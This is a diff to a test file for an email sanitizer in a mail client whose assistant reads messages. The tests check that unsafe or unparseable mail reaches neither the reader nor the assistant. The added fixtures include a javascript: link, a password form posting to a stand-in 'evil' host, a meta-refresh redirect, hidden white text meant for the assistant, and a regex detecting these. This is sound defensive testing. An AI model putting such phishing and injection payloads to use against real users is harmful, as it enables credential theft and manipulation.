@@ -1,7 +1,7 @@
 // @vitest-environment jsdom
 import { describe, expect, it, vi } from "vitest";
-import { mailDocument, readableBody } from "@plainva/ui";
-import { mailBodyHtml, mailBodyView, mailHtmlViewSoon, mailMessageText, sanitizeEmailHtml, type MailMessage } from "@plainva/ui/mail";
+import { mailDocument, readableBody, UNREADABLE_BODY } from "@plainva/ui";
+import { mailBodyHtml, mailBodyView, mailMessageText, sanitizeEmailHtml, type MailMessage } from "@plainva/ui/mail";
 
 /**
  * What the assistant reads of a mail is what the reader shows of it
@@ -335,8 +335,7 @@ describe("one pass over a message (review of 2026-11-17)", () => {
       const without = mailBodyView({ ...message(html), text: "Plain." });
       expect(without?.html).not.toContain("cdn.example.org");
       expect(without?.blockedRemote).toBe(1);
-      // The message is parsed once (the sanitizer's own empty documents for its steps aside).
-      expect(parse.mock.calls.filter(([text]) => String(text).includes("Hello there.")).length).toBe(1);
+      expect(parse).toHaveBeenCalledTimes(1);
     } finally {
       parse.mockRestore();
     }
@@ -352,72 +351,59 @@ describe("one pass over a message (review of 2026-11-17)", () => {
       expect(mailBodyView(both)).toBe(shown);
       expect(readableBody(both, 40000).text).toBe("Hello there.");
       expect(mailMessageText({ text: null, html })).toBe("Hello there.");
-      // The message is parsed once (the sanitizer's own empty documents for its steps aside).
-      expect(parse.mock.calls.filter(([text]) => String(text).includes("Hello there.")).length).toBe(1);
+      expect(parse).toHaveBeenCalledTimes(1);
     } finally {
       parse.mockRestore();
     }
   });
 });
 
-describe("the assistant reads a mail nobody opened in steps (review of 2026-11-17, round 5)", () => {
-  /** A newsletter of many stories, each a table of its own, inside one wrapper — larger than one step of the sanitizer. */
-  const newsletter = (stories: number, tag: string) =>
-    `<table width="100%"><tr><td><div style="max-width:600px">${Array.from(
-      { length: stories },
-      (_, i) => `<table style="background-color:#fff"><tr><td style="padding:20px;color:#333"><h2 style="margin:0">Story ${i}</h2><p>Words of story ${i}. <a href="https://news.example.com/${i}">More</a></p><img src="https://cdn.example.com/${i}.jpg" width="540" height="300"></td></tr></table>`,
-    ).join("")}</div></td></tr></table><!-- ${tag} -->`;
 
-  it("gives the same markup and the same reading as the pass made at once", async () => {
-    const mails = [
-      newsletter(120, `a${Math.random()}`),
-      // A large element the sanitizer takes away with its content, and one it takes away keeping it.
-      `<p>before</p><form>${"<p>in a form</p>".repeat(400)}</form><style>${"p{}".repeat(10)}</style><noembed>${"<b>x</b>".repeat(400)}</noembed><p>after ${Math.random()}</p>`,
-      // A message that names its elements like the tree's own questions.
-      `<p>A</p><img name="body" src="cid:x"><form name="body"><input name="childNodes"><input name="firstChild">${"<p>Formular</p>".repeat(300)}</form><p>B ${Math.random()}</p>`,
-      // A large box without words beside words, and a table row whose cells come in steps.
-      `<table><tr>${Array.from({ length: 200 }, (_, i) => `<td width="300" style="padding:0 20px">cell ${i}</td>`).join("")}</tr></table><div style="height:1px;background-color:#eee">${"<span></span>".repeat(300)}</div><p>end ${Math.random()}</p>`,
-    ];
-    for (const html of mails) {
-      const soon = await mailHtmlViewSoon(html);
-      const markup = soon.html;
-      const reading = soon.document();
-      // A pass made at once over the same mail, apart from the one kept for it.
-      const atOnce = sanitizeEmailHtml(`${html} `);
-      expect(markup).toBe(atOnce.html.replace(/ $/, ""));
-      expect(reading).toEqual(mailBodyView({ html: `${html} `, text: null })!.document());
-    }
+describe("a mail the sanitizer cannot make safe is given to nobody as it came (review of 2026-11-18)", () => {
+  /** What must never reach the reader's frame, the assistant or a quote. */
+  const RAW = `<style>p{color:red}</style><a href="javascript:alert(1)">VISIBLE link</a><form action="https://evil.example.invalid/"><input name="pw"></form><meta http-equiv="refresh" content="1;url=https://evil.example.invalid/">`;
+  const expectNothingRaw = (html: string) => {
+    expect(html).not.toMatch(/<style|<form|<meta|<input|javascript:|evil\.example/i);
+  };
+
+  it("a mail that opens with a frameset: the text part where there is one, else a sentence", () => {
+    const html = `<frameset></frameset><div style="color:#ffffff">${SECRET} white</div><p>VISIBLE words</p>${RAW}<!-- ${Math.random()} -->`;
+    const alone = mailBodyView({ html, text: null });
+    expect(alone).not.toBeNull();
+    expectNothingRaw(alone!.html);
+    expect(alone!.unreadable).toBe(true);
+    expect(readableBody({ html, text: null }, 40000).text).toBe(UNREADABLE_BODY);
+    expect(mailBodyView({ html, text: "The plain part." })).toBeNull();
+    expect(readableBody({ html, text: "The plain part." }, 40000).text).toBe("The plain part.");
   });
 
-  it("lets the interface in between its steps, and the reading after it finds the pass made", async () => {
-    const html = newsletter(200, `b${Math.random()}`);
-    let turns = 0;
-    let on = true;
-    const channel = new MessageChannel();
-    channel.port1.onmessage = () => {
-      turns++;
-      if (on) channel.port2.postMessage(null);
-    };
-    channel.port2.postMessage(null);
-    const now = vi.spyOn(performance, "now");
-    // Every step seems to take longer than a slice: the pass hands over after each.
-    let clock = 0;
-    now.mockImplementation(() => (clock += 10));
+  it("text with a '<x' and a comment reads as text, the comment is no word and nothing raw stands", () => {
+    const html = `x &lt;y<!-- z ${Math.random()} -->${RAW}`;
+    const view = mailBodyView({ html, text: null })!;
+    expect(view.unreadable).toBeUndefined();
+    expectNothingRaw(view.html);
+    expect(view.html).not.toContain("<!--");
+    const read = readableBody({ html, text: null }, 40000).text;
+    expect(read).toContain("x <y");
+    expect(read).not.toContain(" z ");
+  });
+
+  it("a pass that throws hands nobody the markup: not the reader, not the assistant, not a quote", () => {
+    const html = `<p>VISIBLE ${Math.random()}</p><div style="color:#fff">${SECRET}</div>${RAW}`;
+    const parse = vi.spyOn(DOMParser.prototype, "parseFromString").mockImplementation(() => {
+      throw new Error("the sanitizer broke");
+    });
     try {
-      await mailHtmlViewSoon(html);
-    } finally {
-      now.mockRestore();
-      on = false;
-      channel.port1.close();
-    }
-    expect(turns).toBeGreaterThan(5);
-    const parse = vi.spyOn(DOMParser.prototype, "parseFromString");
-    try {
-      expect(readableBody({ html, text: null }, 40000).text).toContain("Words of story 199.");
-      expect(parse).not.toHaveBeenCalled();
+      const alone = mailBodyView({ html, text: null })!;
+      expect(alone.unreadable).toBe(true);
+      expect(alone.html).toBe("");
+      expect(mailBodyHtml({ html, text: null })).toBeNull();
+      expect(readableBody({ html, text: null }, 40000).text).toBe(UNREADABLE_BODY);
+      expect(mailMessageText({ html, text: null })).not.toContain(SECRET);
+      expect(mailBodyView({ html, text: "Plain." })).toBeNull();
+      expect(readableBody({ html, text: "Plain." }, 40000).text).toBe("Plain.");
     } finally {
       parse.mockRestore();
     }
   });
 });
-
